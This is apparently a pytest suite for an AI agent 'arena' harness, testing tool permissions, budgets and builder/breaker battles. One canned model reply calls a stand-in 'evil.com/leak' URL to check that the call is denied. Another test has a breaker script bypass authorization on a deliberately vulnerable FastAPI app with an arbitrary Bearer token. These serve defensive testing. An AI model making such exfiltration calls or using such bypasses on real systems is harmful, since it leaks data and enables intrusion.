"""Unit and integration tests for the SeekHarness Agent Ecosystem."""

from __future__ import annotations

import pytest

from agent_arena.agents import (
    BUILDER_V1,
    BREAKER_V1,
    FIGHTER_V1,
    JUDGE_V1,
    REVIEWER_V1,
    BUILDER_FASTAPI,
    BUILDER_SECURITY_HARDENING,
    BUILDER_PYTHON_KATA,
    AgentConfig,
    get_agent,
    get_agent_for_role,
    list_agents,
    register_agent,
)
from agent_arena.agents.models import ToolPermissions
from agent_arena.fighter_context import (
    build_fighter_system_prompt,
    fighter_tool_grammar,
)
from agent_arena.tool_protocol import REGISTRY


def test_registry_contains_canonical_and_specialized_agents():
    agents = list_agents()
    agent_ids = {a.agent_id for a in agents}
    assert "builder-v1" in agent_ids
    assert "breaker-v1" in agent_ids
    assert "fighter-v1" in agent_ids
    assert "judge-v1" in agent_ids
    assert "reviewer-v1" in agent_ids

    # Specialized profiles
    assert "builder-fastapi" in agent_ids
    assert "builder-security-hardening" in agent_ids
    assert "builder-python-kata" in agent_ids
    assert "breaker-auth" in agent_ids
    assert "breaker-api" in agent_ids
    assert "breaker-web" in agent_ids
    assert "reviewer-security" in agent_ids


def test_specialized_builder_profiles_invariants():
    fastapi_builder = get_agent("builder-fastapi")
    assert fastapi_builder is not None
    assert fastapi_builder.role == "builder"
    assert "FastAPI Backend Builder" in fastapi_builder.name
    assert "REST Semantics" in fastapi_builder.system_prompt
    assert fastapi_builder.tool_permissions.is_allowed("test")
    assert not fastapi_builder.tool_permissions.is_allowed("fetch")

    sec_builder = get_agent("builder-security-hardening")
    assert sec_builder is not None
    assert sec_builder.role == "builder"
    assert "AppSec Hardening Builder" in sec_builder.name
    assert "Fail-closed security" in sec_builder.system_prompt
    assert sec_builder.tool_permissions.is_allowed("write")

    kata_builder = get_agent("builder-python-kata")
    assert kata_builder is not None
    assert kata_builder.role == "builder"
    assert "Python Kata & Algorithmic Builder" in kata_builder.name
    assert kata_builder.budgets.max_turns == 30
    assert kata_builder.tool_permissions.is_allowed("test")


def test_specialized_breaker_profiles_invariants():
    auth_breaker = get_agent("breaker-auth")
    assert auth_breaker is not None
    assert auth_breaker.role == "breaker"
    assert "Auth & Session Vulnerability Breaker" in auth_breaker.name
    assert "session-replay-attacker" in auth_breaker.skill_bundle
    assert "auth-flow-debugger" in auth_breaker.skill_bundle
    assert auth_breaker.tool_permissions.is_allowed("run")
    assert auth_breaker.tool_permissions.is_allowed("write")
    assert not auth_breaker.tool_permissions.is_allowed("test")
    assert not auth_breaker.tool_permissions.is_allowed("fetch")
    assert "exploit.py" in auth_breaker.evidence_contract.required_artifacts

    api_breaker = get_agent("breaker-api")
    assert api_breaker is not None
    assert api_breaker.role == "breaker"
    assert "REST API & Parameter Tampering Breaker" in api_breaker.name
    assert "api-contract-auditor" in api_breaker.skill_bundle
    assert "injection-tester" in api_breaker.skill_bundle
    assert api_breaker.tool_permissions.is_allowed("run")
    assert not api_breaker.tool_permissions.is_allowed("test")
    assert not api_breaker.tool_permissions.is_allowed("fetch")

    web_breaker = get_agent("breaker-web")
    assert web_breaker is not None
    assert web_breaker.role == "breaker"
    assert "Full-Stack Web & SSRF Breaker" in web_breaker.name
    assert "browser-ui-debugger" in web_breaker.skill_bundle
    assert "trust-boundary-auditor" in web_breaker.skill_bundle
    assert web_breaker.tool_permissions.is_allowed("run")
    assert not web_breaker.tool_permissions.is_allowed("test")


def test_specialized_reviewer_security_invariants():
    rev_sec = get_agent("reviewer-security")
    assert rev_sec is not None
    assert rev_sec.role == "reviewer"
    assert "Security Invariants Reviewer" in rev_sec.name
    assert "trust-boundary-auditor" in rev_sec.skill_bundle
    assert "data-integrity-checker" in rev_sec.skill_bundle
    # Strictly read-only
    assert rev_sec.tool_permissions.is_allowed("read")
    assert rev_sec.tool_permissions.is_allowed("grep")
    assert not rev_sec.tool_permissions.is_allowed("write")
    assert not rev_sec.tool_permissions.is_allowed("run")
    assert not rev_sec.tool_permissions.is_allowed("shell")
    assert not rev_sec.tool_permissions.is_allowed("test")


def test_get_agent_and_role_defaults():
    builder = get_agent_for_role("builder")
    assert builder is not None
    assert builder.agent_id == "builder-v1"
    assert builder.role == "builder"
    assert builder.model.preferred == "host:or-qwen3-coder"

    breaker = get_agent_for_role("breaker")
    assert breaker is not None
    assert breaker.agent_id == "breaker-v1"
    assert breaker.role == "breaker"

    reviewer = get_agent_for_role("reviewer")
    assert reviewer is not None
    assert reviewer.agent_id == "reviewer-v1"
    assert reviewer.role == "reviewer"


def test_builder_v1_specification_invariants():
    builder = BUILDER_V1
    assert "defensive-builder" in builder.skill_bundle
    assert "root-cause-first" in builder.skill_bundle
    assert "minimal-change-repair" in builder.skill_bundle
    assert "traceback-triage" in builder.skill_bundle

    # Tools: Builder has code and test tools, but no network fetch
    assert builder.tool_permissions.is_allowed("read")
    assert builder.tool_permissions.is_allowed("write")
    assert builder.tool_permissions.is_allowed("test")
    assert builder.tool_permissions.is_allowed("shell")
    assert not builder.tool_permissions.is_allowed("fetch")
    assert not builder.tool_permissions.is_allowed("bg")


def test_breaker_v1_specification_invariants():
    breaker = BREAKER_V1
    assert "attack-surface-mapper" in breaker.skill_bundle
    assert "authorization-boundary-auditor" in breaker.skill_bundle
    assert "exploit-evidence-builder" in breaker.skill_bundle

    assert breaker.tool_permissions.is_allowed("read")
    assert breaker.tool_permissions.is_allowed("write")
    assert breaker.tool_permissions.is_allowed("shell")
    assert not breaker.tool_permissions.is_allowed("fetch")


def test_reviewer_v1_read_only_boundary():
    reviewer = REVIEWER_V1
    # Read-only tools allowed
    assert reviewer.tool_permissions.is_allowed("read")
    assert reviewer.tool_permissions.is_allowed("ls")
    assert reviewer.tool_permissions.is_allowed("grep")
    assert reviewer.tool_permissions.is_allowed("tree")

    # Mutation and execution tools strictly denied
    assert not reviewer.tool_permissions.is_allowed("write")
    assert not reviewer.tool_permissions.is_allowed("clean")
    assert not reviewer.tool_permissions.is_allowed("shell")
    assert not reviewer.tool_permissions.is_allowed("run")
    assert not reviewer.tool_permissions.is_allowed("install")
    assert not reviewer.tool_permissions.is_allowed("rm")


def test_empty_allowlist_fails_closed_and_denials_win():
    policy = ToolPermissions(allowed_tools=[], denied_tools=["read"])
    assert not policy.is_allowed("read")
    assert not policy.is_allowed("write")
    assert policy.resolved_allowed_tools({"read", "write"}) == set()

    # The canonical judge intentionally has no execution tools.
    assert JUDGE_V1.tool_permissions.resolved_allowed_tools({"read", "write"}) == set()


def test_tool_registry_schema_filtering():
    all_schemas = REGISTRY.openai_schemas()
    assert len(all_schemas) > 10

    # Filter to builder allowed tools
    builder_schemas = REGISTRY.openai_schemas(allowed_tools=["read", "write", "test"])
    names = {s["function"]["name"] for s in builder_schemas}
    assert names == {"read", "write", "test"}
    assert "fetch" not in names
    assert "shell" not in names

    # Filter to reviewer read-only tools
    reviewer_schemas = REGISTRY.openai_schemas(allowed_tools=["read", "ls", "grep", "tree"])
    r_names = {s["function"]["name"] for s in reviewer_schemas}
    assert r_names == {"read", "ls", "grep", "tree"}
    assert "write" not in r_names


def test_fighter_context_prompt_composition():
    prompt = build_fighter_system_prompt(
        role="builder",
        format_name="builder_breaker",
        mission="Harden auth service",
        max_steps=24,
        max_turns=10,
    )
    assert "Defensive Architect" in prompt
    assert "BEHAVIORAL GUIDELINES" in prompt
    assert "Inspect before modifying" in prompt
    assert "ANTI-PATTERNS (DO NOT DO)" in prompt
    assert "Never fabricate test results" in prompt
    assert "COMPLETION & EVIDENCE" in prompt


def test_sandbox_agent_binding_does_not_import_control_plane_provider_dependencies(
    monkeypatch,
):
    import builtins
    import json

    from agent_arena.sandbox.agent_runtime import resolve_role_runtime_bindings

    monkeypatch.setenv("ARENA_IN_SANDBOX", "1")
    monkeypatch.setenv("BATTLE_TOKEN", "scoped-test-token")
    monkeypatch.setenv("BATTLE_BOOTSTRAP_JSON", json.dumps({"trusted": True}))
    real_import = builtins.__import__

    def guarded_import(name, *args, **kwargs):
        if name.startswith("agent_arena.providers") or name.startswith("appwrite"):
            raise AssertionError(f"sandbox imported control-plane dependency: {name}")
        return real_import(name, *args, **kwargs)

    monkeypatch.setattr(builtins, "__import__", guarded_import)
    bindings = resolve_role_runtime_bindings(
        {"builder": "host:or-qwen3-coder"},
        {"role_to_agent_id": {"builder": "builder-v1"}},
    )
    assert bindings["builder"].agent.agent_id == "builder-v1"
    assert bindings["builder"].model_id == "host:or-qwen3-coder"


def test_fighter_tool_grammar_filtering():
    full_grammar = fighter_tool_grammar()
    assert "TOOL fetch" in full_grammar
    assert "TOOL bg" in full_grammar

    builder_grammar = fighter_tool_grammar(allowed_tools=["read", "write", "test"])
    assert "TOOL read" in builder_grammar
    assert "TOOL write" in builder_grammar
    assert "TOOL test" in builder_grammar
    assert "TOOL fetch" not in builder_grammar
    assert "TOOL bg" not in builder_grammar


def test_reviewer_restrictions_are_enforced_at_tool_dispatch(tmp_path):
    from agent_arena.sandbox.executors.advanced_executor import ToolSession

    allowed = REVIEWER_V1.tool_permissions.resolved_allowed_tools(REGISTRY.all_names())
    session = ToolSession(tmp_path, allowed_tools=allowed)
    result = session.exec_tool(
        {"tool": "write", "path": "should-not-exist.txt", "content": "nope"}
    )

    assert result.success is False
    assert result.error_type == "permission_denied"
    assert not (tmp_path / "should-not-exist.txt").exists()


def test_restricted_skill_session_cannot_fall_back_to_global_skills(tmp_path):
    from agent_arena.sandbox.executors.advanced_executor import ToolSession

    configured = tmp_path / ".agents" / "skills" / "configured-skill"
    configured.mkdir(parents=True)
    (configured / "SKILL.md").write_text("configured body", encoding="utf-8")
    session = ToolSession(tmp_path, allowed_skill_names={"configured-skill"})

    assert session.use_skill("configured-skill").success is True
    denied = session.use_skill("secure-code-execution")
    assert denied.success is False
    assert denied.error_type == "permission_denied"
    assert "secure-code-execution" not in session.skills(list=True).output


def test_explicit_agent_binding_activates_admitted_model_preference():
    from agent_arena.sandbox.agent_runtime import resolve_role_runtime_bindings
    from agent_arena.providers import get_model_spec

    bindings = resolve_role_runtime_bindings(
        {"builder": "host:or-qwen3-coder"},
        {"role_to_agent_id": {"builder": "builder-v1"}},
    )
    binding = bindings["builder"]
    assert binding.agent.agent_id == "builder-v1"
    assert binding.model_id == "host:or-qwen3-coder"
    assert binding.model_source == "agent_preferred"
    assert "builder" in get_model_spec(binding.model_id).roles


def test_internal_model_client_carries_agent_inference_preferences():
    from agent_arena.sandbox.client import FakeTransport, InternalClient

    transport = FakeTransport()
    client = InternalClient(transport)
    client.model(
        "battle-id",
        "host:or-qwen3-coder",
        [{"role": "user", "content": "hello"}],
        max_tokens=512,
        temperature=0.2,
        reasoning_effort="high",
    )
    path, payload = transport.calls[-1]
    assert path == "/internal/model"
    assert payload["max_tokens"] == 512
    assert payload["temperature"] == 0.2
    assert payload["reasoning_effort"] == "high"


def test_explicit_agent_budget_caps_the_existing_execution_loop(monkeypatch):
    import json
    from agent_arena.agents import registry as agent_registry
    from agent_arena.sandbox.client import FakeTransport, InternalClient
    from agent_arena.sandbox.executors.advanced_executor import AdvancedExecutor

    tiny_builder = BUILDER_V1.model_copy(deep=True)
    tiny_builder.agent_id = "test-builder-budget"
    tiny_builder.budgets.max_turns = 1
    tiny_builder.budgets.max_steps = 1
    tiny_builder.budgets.total_timeout_seconds = 30
    monkeypatch.setitem(agent_registry._REGISTRY, tiny_builder.agent_id, tiny_builder)
    monkeypatch.setenv("ARENA_IN_SANDBOX", "1")
    monkeypatch.setenv("ARENA_PREVIEW", "0")

    transport = FakeTransport()
    transport.model_replies = {
        "budget-model": "TOOL ls\n",
        "other-model": "DONE\n",
    }
    executor = AdvancedExecutor()
    executor.run_battle(
        battle_id="agent-budget-test",
        format_config={
            "name": "Budget fixture",
            "roles": ["player_a", "player_b", "judge"],
            "phases": [{"name": "race", "participants": ["player_a", "player_b"]}],
            "role_to_agent_id": {"player_a": tiny_builder.agent_id},
            "max_tool_turns": 4,
            "max_tool_steps": 8,
        },
        model_ids=["budget-model", "other-model"],
        round_visibility="isolated",
        client=InternalClient(transport),
        role_to_model={"player_a": "budget-model", "player_b": "other-model"},
        timeout_seconds=60,
    )

    results = [
        json.loads(item["artifact"].split("EXECUTOR_RESULT: ", 1)[1])
        for item in transport.rounds
        if item.get("artifact", "").startswith("EXECUTOR_RESULT: ")
    ]
    budget_result = next(item for item in results if item["model_id"] == "budget-model")
    assert budget_result["turns"] == 1
    assert budget_result["steps"] == 1
    assert budget_result["terminal_reason"] == "turn_budget_exhausted"


def test_builder_tool_permission_denial_in_executor(tmp_path, monkeypatch):
    """Verify that if a model attempts to call an unauthorized tool, executor denies it."""
    import json
    from agent_arena.sandbox.client import FakeTransport, InternalClient
    from agent_arena.sandbox.executors.advanced_executor import AdvancedExecutor

    monkeypatch.setenv("ARENA_IN_SANDBOX", "1")
    monkeypatch.setenv("ARENA_PREVIEW", "0")

    transport = FakeTransport()
    # Builder tries to call unauthorized 'fetch'
    canned = (
        'TOOL fetch url=https://evil.com/leak\n'
        'TOOL write solution.py\ndef is_palindrome(s): return s == s[::-1]\n'
        'TOOL test\n'
        'DONE\n'
    )
    transport.model_replies = {"test-builder": canned}
    transport.judge_result = {
        "scores": {"test-builder": 100.0},
        "justifications": {"test-builder": "ok"},
        "judge_model": "mock",
    }

    client = InternalClient(transport)
    executor = AdvancedExecutor()

    cfg = {
        "name": "Testing Agent Permissions",
        "format": "build_and_break",
        "roles": ["builder", "breaker"],
        "max_steps": 10,
        "max_turns": 4,
        "starter_files": {},
        "battle_plan": {
            "phases": [
                {
                    "phase_id": "build",
                    "phase_type": "build",
                    "actor": "builder",
                    "starter_files": {},
                    "required_outputs": ["solution.py"],
                    "workspace_policy": "fresh",
                }
            ]
        },
    }

    scores = executor.run_battle(
        battle_id="test-permission-battle-1",
        format_config=cfg,
        model_ids=["test-builder"],
        round_visibility="isolated",
        client=client,
        role_to_model={"builder": "test-builder"},
        timeout_seconds=60,
    )

    # Verify that a tool_permission_denied event was emitted
    actions = [
        json.loads(r["artifact"])
        for r in transport.rounds
        if r.get("artifact", "").startswith("{") and "action" in r.get("artifact", "")
    ]
    denied_actions = [
        a for a in actions if a.get("action") == "tool_permission_denied"
    ]
    assert len(denied_actions) >= 1
    assert denied_actions[0]["target"] == "fetch"
    assert "not authorized" in denied_actions[0]["result"]


def test_builder_agent_runs_authentication_gate(monkeypatch):
    """Hermetic executor integration against the authentication-gate fixture."""
    import json
    from pathlib import Path
    from agent_arena.sandbox.client import FakeTransport, InternalClient
    from agent_arena.sandbox.executors.advanced_executor import AdvancedExecutor
    from agent_arena.target_library import load_target_bundle, compile_target_to_battle_config
    from agent_arena.target_verifier import verify_builder_breaker_submission

    monkeypatch.setenv("ARENA_IN_SANDBOX", "1")
    monkeypatch.setenv("ARENA_PREVIEW", "0")
    monkeypatch.setenv("ARENA_VERIFIER_ALLOW_INPROCESS", "1")

    # Load authentic production authentication-gate bundle
    library_root = Path(__file__).resolve().parents[2] / "targets" / "library"
    bundle = load_target_bundle(library_root / "authentication-gate")
    cfg = compile_target_to_battle_config(bundle, arena_size=2)

    # Builder implementation of hardened auth service
    hardened_app = (
        "import secrets\n"
        "from fastapi import FastAPI, Header, HTTPException\n"
        "from pydantic import BaseModel\n\n"
        "app = FastAPI()\n"
        "USERS = {'admin': 'swordfish', 'guest': 'guest'}\n"
        "TOKENS = {}\n\n"
        "class Login(BaseModel):\n"
        "    username: str\n"
        "    password: str\n\n"
        "@app.post('/login')\n"
        "def login(body: Login):\n"
        "    if USERS.get(body.username) != body.password:\n"
        "        raise HTTPException(status_code=401, detail='invalid credentials')\n"
        "    token = secrets.token_hex(16)\n"
        "    TOKENS[token] = body.username\n"
        "    return {'token': token}\n\n"
        "@app.get('/admin')\n"
        "def admin(authorization: str | None = Header(default=None)):\n"
        "    if not authorization or not authorization.startswith('Bearer '):\n"
        "        raise HTTPException(status_code=401)\n"
        "    token = authorization.removeprefix('Bearer ')\n"
        "    if token not in TOKENS or TOKENS[token] != 'admin':\n"
        "        raise HTTPException(status_code=403)\n"
        "    return {'secret': 'ARENA_ADMIN_OK'}\n"
    )

    builder_turn = (
        f"TOOL write path=app.py\n{hardened_app}\nEND_TOOL\n"
        "TOOL write path=THEORY.md\nHarden /login password verification with secrets token and protect /admin.\nEND_TOOL\n"
        "TOOL test\n"
        "DONE\n"
    )

    # Breaker tries an unauthenticated bypass
    breaker_turn = (
        "TOOL write path=exploit.py\nimport requests, sys\n# Try unauthenticated access\nsys.exit(1)\nEND_TOOL\n"
        "DONE\n"
    )

    transport = FakeTransport()
    transport.model_replies = {
        "builder-model": builder_turn,
        "breaker-model": breaker_turn,
    }
    transport.judge_result = {
        "scores": {"builder-model": 100.0, "breaker-model": 0.0},
        "justifications": {"builder-model": "pass", "breaker-model": "fail"},
        "judge_model": "mock",
    }

    client = InternalClient(transport)
    executor = AdvancedExecutor()

    scores = executor.run_battle(
        battle_id="test-auth-gate-builder-run",
        format_config=cfg,
        model_ids=["builder-model", "breaker-model"],
        round_visibility="isolated",
        client=client,
        role_to_model={"builder": "builder-model", "breaker": "breaker-model"},
        timeout_seconds=120,
    )

    # Confirm battle finished and builder passed
    assert scores is not None
    rounds_text = "\n".join(r.get("artifact", "") for r in transport.rounds)
    assert "TEST_PASS" in rounds_text


def test_breaker_agent_runs_authentication_gate(monkeypatch):
    """Verify breaker agent executes against vulnerable starter and produces valid exploit artifact."""
    import json
    from pathlib import Path
    from agent_arena.sandbox.client import FakeTransport, InternalClient
    from agent_arena.sandbox.executors.advanced_executor import AdvancedExecutor
    from agent_arena.target_library import load_target_bundle, compile_target_to_battle_config

    monkeypatch.setenv("ARENA_IN_SANDBOX", "1")
    monkeypatch.setenv("ARENA_PREVIEW", "0")
    monkeypatch.setenv("ARENA_VERIFIER_ALLOW_INPROCESS", "1")

    # Load authentic production authentication-gate bundle
    library_root = Path(__file__).resolve().parents[2] / "targets" / "library"
    bundle = load_target_bundle(library_root / "authentication-gate")
    cfg = compile_target_to_battle_config(bundle, arena_size=2)
    cfg["role_to_agent_id"] = {"breaker": "breaker-auth"}

    # Builder leaves starter (vulnerable)
    builder_turn = "DONE\n"

    # Breaker inspects and writes working exploit against vulnerable starter app
    exploit_code = (
        "from fastapi.testclient import TestClient\n"
        "import app\n"
        "client = TestClient(app.app)\n"
        "r = client.get('/admin', headers={'Authorization': 'Bearer admin'})\n"
        "assert r.status_code == 200, f'Expected 200, got {r.status_code}'\n"
        "assert r.json().get('secret') == 'ARENA_ADMIN_OK'\n"
        "print('EXPLOIT_OK: admin authorization bypassed')\n"
    )

    breaker_turn = (
        "TOOL read path=app.py\n"
        f"TOOL write path=exploit.py\n{exploit_code}\nEND_TOOL\n"
        "TOOL write path=THEORY.md\nVulnerable starter app allows arbitrary Bearer token access to /admin.\nEND_TOOL\n"
        "TOOL shell cmd='python3 exploit.py'\n"
        "DONE\n"
    )

    transport = FakeTransport()
    transport.model_replies = {
        "builder-model": builder_turn,
        "breaker-model": breaker_turn,
    }
    transport.judge_result = {
        "scores": {"builder-model": 0.0, "breaker-model": 100.0},
        "justifications": {"builder-model": "vulnerable", "breaker-model": "exploit verified"},
        "judge_model": "mock",
    }

    client = InternalClient(transport)
    executor = AdvancedExecutor()

    scores = executor.run_battle(
        battle_id="test-auth-gate-breaker-run",
        format_config=cfg,
        model_ids=["builder-model", "breaker-model"],
        round_visibility="isolated",
        client=client,
        role_to_model={"builder": "builder-model", "breaker": "breaker-model"},
        timeout_seconds=120,
    )

    assert scores is not None
    # Check that breaker action logs executed shell tool
    artifacts = [
        json.loads(r["artifact"])
        for r in transport.rounds
        if r.get("artifact", "").startswith("{") and "action" in r.get("artifact", "")
    ]
    actions = [a.get("action") for a in artifacts]
    assert "shell" in actions

    # Check executor result and breaker artifacts
    exec_results = []
    trusted_ver = {}
    for r in transport.rounds:
        art = str(r.get("artifact") or "")
        if "EXECUTOR_RESULT:" in art:
            payload = json.loads(art.split("EXECUTOR_RESULT:", 1)[1].strip())
            exec_results.append(payload)
        if "TRUSTED_VERIFICATION:" in art:
            trusted_ver = json.loads(art.split("TRUSTED_VERIFICATION:", 1)[1].strip())

    breaker_res = [r for r in exec_results if r.get("role") == "breaker"]
    assert len(breaker_res) >= 1
    assert breaker_res[0]["terminal_reason"] == "fighter_done"
    assert "exploit.py" in breaker_res[0]["artifact_checks"]["present"]
    assert "THEORY.md" in breaker_res[0]["artifact_checks"]["present"]

    # Verify breaker semantic evidence recorded in trusted verification
    sem = trusted_ver.get("breaker_semantic_evidence") or {}
    assert sem.get("artifact_status") == "valid_breaker_artifact"
    assert sem.get("execution_completed") is True
    assert sem.get("process_return_code") == 0
